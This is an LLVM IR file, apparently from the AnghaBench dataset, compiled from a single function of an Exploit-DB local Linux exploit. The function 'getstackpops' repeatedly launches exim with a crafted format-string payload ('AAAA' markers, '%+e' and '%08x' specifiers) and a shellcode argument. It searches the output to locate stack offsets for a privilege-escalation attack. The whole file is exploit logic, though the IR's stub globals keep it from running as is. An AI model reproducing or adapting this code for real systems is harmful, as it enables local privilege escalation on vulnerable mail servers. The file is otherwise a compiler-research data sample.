; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22066.c_getstackpops.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22066.c_getstackpops.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [23 x i8] c"Getting stackpops ...\0A\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"pipe\00", align 1
@port = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [8 x i8] c"/tmp/%s\00", align 1
@PADDING = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [2 x i8] c"Z\00", align 1
@.str.4 = private unnamed_addr constant [33 x i8] c"0000AAAA0000AAAA0000AAAA0000AAAA\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"%+e\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"%08x\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@path = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [5 x i8] c"exim\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"-bd\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"-d\00", align 1
@.str.11 = private unnamed_addr constant [4 x i8] c"-oX\00", align 1
@.str.12 = private unnamed_addr constant [4 x i8] c"-oP\00", align 1
@.str.13 = private unnamed_addr constant [3 x i8] c"-F\00", align 1
@shellcode = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.15 = private unnamed_addr constant [16 x i8] c"pid written to \00", align 1
@.str.16 = private unnamed_addr constant [25 x i8] c"failed to open pid file \00", align 1
@.str.17 = private unnamed_addr constant [4 x i8] c"nan\00", align 1
@.str.18 = private unnamed_addr constant [29 x i8] c"watch out, nan encountered.\0A\00", align 1
@.str.19 = private unnamed_addr constant [21 x i8] c"Stackpops found ;-)\0A\00", align 1
@.str.20 = private unnamed_addr constant [21 x i8] c"trying bs=%d, ss=%d\0A\00", align 1
@.str.21 = private unnamed_addr constant [13 x i8] c"Listening...\00", align 1
@.str.22 = private unnamed_addr constant [7 x i8] c"fdopen\00", align 1
@SIGINT = common dso_local global i32 0, align 4
@.str.23 = private unnamed_addr constant [5 x i8] c"fork\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @getstackpops(i32* %0, i32* %1, i32* %2) #0 {
  %4 = alloca i32*, align 8
  %5 = alloca i32*, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32, align 4
  %8 = alloca [2 x i32], align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [10 x i8], align 1
  %13 = alloca [10000 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca i32*, align 8
  %16 = alloca [10000 x i8], align 16
  store i32* %0, i32** %4, align 8
  store i32* %1, i32** %5, align 8
  store i32* %2, i32** %6, align 8
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 1, i32* %11, align 4
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0))
  %18 = load i32*, i32** %4, align 8
  store i32 0, i32* %18, align 4
  %19 = load i32*, i32** %5, align 8
  store i32 1, i32* %19, align 4
  br label %20

20:                                               ; preds = %167, %3
  %21 = load i32, i32* %9, align 4
  %22 = icmp ne i32 %21, 0
  %23 = xor i1 %22, true
  br i1 %23, label %24, label %174

24:                                               ; preds = %20
  %25 = getelementptr inbounds [2 x i32], [2 x i32]* %8, i64 0, i64 0
  %26 = call i64 @pipe(i32* %25)
  %27 = icmp ne i64 %26, 0
  br i1 %27, label %28, label %31

28:                                               ; preds = %24
  %29 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %30 = call i32 @exit(i32 1) #3
  unreachable

31:                                               ; preds = %24
  %32 = load i32, i32* @port, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* @port, align 4
  %34 = call i32 (...) @fork()
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %7, align 4
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %37, label %87

37:                                               ; preds = %31
  %38 = call i32 @close(i32 2)
  %39 = getelementptr inbounds [2 x i32], [2 x i32]* %8, i64 0, i64 1
  %40 = load i32, i32* %39, align 4
  %41 = call i32 @dup2(i32 %40, i32 2)
  %42 = getelementptr inbounds [10000 x i8], [10000 x i8]* %13, i64 0, i64 0
  %43 = call i32 @strcpy(i8* %42, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %14, align 4
  br label %44

44:                                               ; preds = %51, %37
  %45 = load i32, i32* %14, align 4
  %46 = load i32, i32* @PADDING, align 4
  %47 = icmp slt i32 %45, %46
  br i1 %47, label %48, label %54

48:                                               ; preds = %44
  %49 = getelementptr inbounds [10000 x i8], [10000 x i8]* %13, i64 0, i64 0
  %50 = call i32 @strcat(i8* %49, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  br label %51

51:                                               ; preds = %48
  %52 = load i32, i32* %14, align 4
  %53 = add nsw i32 %52, 1
  store i32 %53, i32* %14, align 4
  br label %44

54:                                               ; preds = %44
  %55 = getelementptr inbounds [10000 x i8], [10000 x i8]* %13, i64 0, i64 0
  %56 = call i32 @strcat(i8* %55, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %14, align 4
  br label %57

57:                                               ; preds = %64, %54
  %58 = load i32, i32* %14, align 4
  %59 = load i32, i32* %10, align 4
  %60 = icmp slt i32 %58, %59
  br i1 %60, label %61, label %67

61:                                               ; preds = %57
  %62 = getelementptr inbounds [10000 x i8], [10000 x i8]* %13, i64 0, i64 0
  %63 = call i32 @strcat(i8* %62, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i64 0, i64 0))
  br label %64

64:                                               ; preds = %61
  %65 = load i32, i32* %14, align 4
  %66 = add nsw i32 %65, 1
  store i32 %66, i32* %14, align 4
  br label %57

67:                                               ; preds = %57
  store i32 0, i32* %14, align 4
  br label %68

68:                                               ; preds = %75, %67
  %69 = load i32, i32* %14, align 4
  %70 = load i32, i32* %11, align 4
  %71 = icmp slt i32 %69, %70
  br i1 %71, label %72, label %78

72:                                               ; preds = %68
  %73 = getelementptr inbounds [10000 x i8], [10000 x i8]* %13, i64 0, i64 0
  %74 = call i32 @strcat(i8* %73, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0))
  br label %75

75:                                               ; preds = %72
  %76 = load i32, i32* %14, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %14, align 4
  br label %68

78:                                               ; preds = %68
  %79 = getelementptr inbounds [10 x i8], [10 x i8]* %12, i64 0, i64 0
  %80 = load i32, i32* @port, align 4
  %81 = call i32 @sprintf(i8* %79, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i32 %80)
  %82 = load i32, i32* @path, align 4
  %83 = getelementptr inbounds [10 x i8], [10 x i8]* %12, i64 0, i64 0
  %84 = getelementptr inbounds [10000 x i8], [10000 x i8]* %13, i64 0, i64 0
  %85 = load i32, i32* @shellcode, align 4
  %86 = call i32 @execl(i32 %82, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.11, i64 0, i64 0), i8* %83, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* %84, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i64 0, i64 0), i32 %85, i32* null)
  br label %167

87:                                               ; preds = %31
  %88 = load i32, i32* %7, align 4
  %89 = icmp sgt i32 %88, 0
  br i1 %89, label %90, label %164

90:                                               ; preds = %87
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %8, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32* @fdopen(i32 %92, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i64 0, i64 0))
  store i32* %93, i32** %15, align 8
  %94 = load i32*, i32** %15, align 8
  %95 = icmp ne i32* %94, null
  br i1 %95, label %96, label %157

96:                                               ; preds = %90
  br label %97

97:                                               ; preds = %149, %96
  %98 = getelementptr inbounds [10000 x i8], [10000 x i8]* %16, i64 0, i64 0
  %99 = load i32*, i32** %15, align 8
  %100 = call i32 @fgets(i8* %98, i32 10000, i32* %99)
  %101 = getelementptr inbounds [10000 x i8], [10000 x i8]* %16, i64 0, i64 0
  %102 = call i32 @strlen(i8* %101)
  %103 = sub nsw i32 %102, 1
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds [10000 x i8], [10000 x i8]* %16, i64 0, i64 %104
  store i8 0, i8* %105, align 1
  %106 = getelementptr inbounds [10000 x i8], [10000 x i8]* %16, i64 0, i64 0
  %107 = call i64 @strstr(i8* %106, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.15, i64 0, i64 0))
  %108 = icmp ne i64 %107, 0
  br i1 %108, label %113, label %109

109:                                              ; preds = %97
  %110 = getelementptr inbounds [10000 x i8], [10000 x i8]* %16, i64 0, i64 0
  %111 = call i64 @strstr(i8* %110, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.16, i64 0, i64 0))
  %112 = icmp ne i64 %111, 0
  br i1 %112, label %113, label %148

113:                                              ; preds = %109, %97
  %114 = getelementptr inbounds [10000 x i8], [10000 x i8]* %16, i64 0, i64 0
  %115 = call i64 @strstr(i8* %114, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.17, i64 0, i64 0))
  %116 = icmp ne i64 %115, 0
  br i1 %116, label %117, label %119

117:                                              ; preds = %113
  %118 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.18, i64 0, i64 0))
  br label %119

119:                                              ; preds = %117, %113
  %120 = getelementptr inbounds [10000 x i8], [10000 x i8]* %16, i64 0, i64 0
  %121 = call i32 @check_for_AAAA(i8* %120)
  %122 = icmp eq i32 %121, 1
  br i1 %122, label %123, label %135

123:                                              ; preds = %119
  store i32 1, i32* %9, align 4
  %124 = load i32, i32* %10, align 4
  %125 = add nsw i32 %124, -1
  store i32 %125, i32* %10, align 4
  %126 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.19, i64 0, i64 0))
  %127 = load i32, i32* %10, align 4
  %128 = load i32*, i32** %4, align 8
  store i32 %127, i32* %128, align 4
  %129 = load i32, i32* %11, align 4
  %130 = load i32*, i32** %5, align 8
  store i32 %129, i32* %130, align 4
  %131 = getelementptr inbounds [10000 x i8], [10000 x i8]* %16, i64 0, i64 0
  %132 = call i32 @calc_bytes_written(i8* %131)
  %133 = sub nsw i32 %132, 13
  %134 = load i32*, i32** %6, align 8
  store i32 %133, i32* %134, align 4
  br label %147

135:                                              ; preds = %119
  %136 = load i32, i32* %11, align 4
  %137 = add nsw i32 %136, 1
  store i32 %137, i32* %11, align 4
  %138 = load i32, i32* %11, align 4
  %139 = icmp eq i32 %138, 3
  br i1 %139, label %140, label %143

140:                                              ; preds = %135
  %141 = load i32, i32* %10, align 4
  %142 = add nsw i32 %141, 1
  store i32 %142, i32* %10, align 4
  store i32 1, i32* %11, align 4
  br label %143

143:                                              ; preds = %140, %135
  %144 = load i32, i32* %10, align 4
  %145 = load i32, i32* %11, align 4
  %146 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.20, i64 0, i64 0), i32 %144, i32 %145)
  br label %147

147:                                              ; preds = %143, %123
  br label %148

148:                                              ; preds = %147, %109
  br label %149

149:                                              ; preds = %148
  %150 = getelementptr inbounds [10000 x i8], [10000 x i8]* %16, i64 0, i64 0
  %151 = call i64 @strstr(i8* %150, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.21, i64 0, i64 0))
  %152 = icmp ne i64 %151, 0
  %153 = xor i1 %152, true
  br i1 %153, label %97, label %154

154:                                              ; preds = %149
  %155 = load i32*, i32** %15, align 8
  %156 = call i32 @fclose(i32* %155)
  br label %159

157:                                              ; preds = %90
  %158 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.22, i64 0, i64 0))
  br label %159

159:                                              ; preds = %157, %154
  %160 = load i32, i32* %7, align 4
  %161 = load i32, i32* @SIGINT, align 4
  %162 = call i32 @kill(i32 %160, i32 %161)
  %163 = call i32 @usleep(i32 100000)
  br label %166

164:                                              ; preds = %87
  %165 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i64 0, i64 0))
  br label %166

166:                                              ; preds = %164, %159
  br label %167

167:                                              ; preds = %166, %78
  %168 = getelementptr inbounds [2 x i32], [2 x i32]* %8, i64 0, i64 0
  %169 = load i32, i32* %168, align 4
  %170 = call i32 @close(i32 %169)
  %171 = getelementptr inbounds [2 x i32], [2 x i32]* %8, i64 0, i64 1
  %172 = load i32, i32* %171, align 4
  %173 = call i32 @close(i32 %172)
  br label %20

174:                                              ; preds = %20
  ret void
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @pipe(i32*) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @fork(...) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @dup2(i32, i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i32) #1

declare dso_local i32 @execl(i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i32, i32*) #1

declare dso_local i32* @fdopen(i32, i8*) #1

declare dso_local i32 @fgets(i8*, i32, i32*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @strstr(i8*, i8*) #1

declare dso_local i32 @check_for_AAAA(i8*) #1

declare dso_local i32 @calc_bytes_written(i8*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i32 @usleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
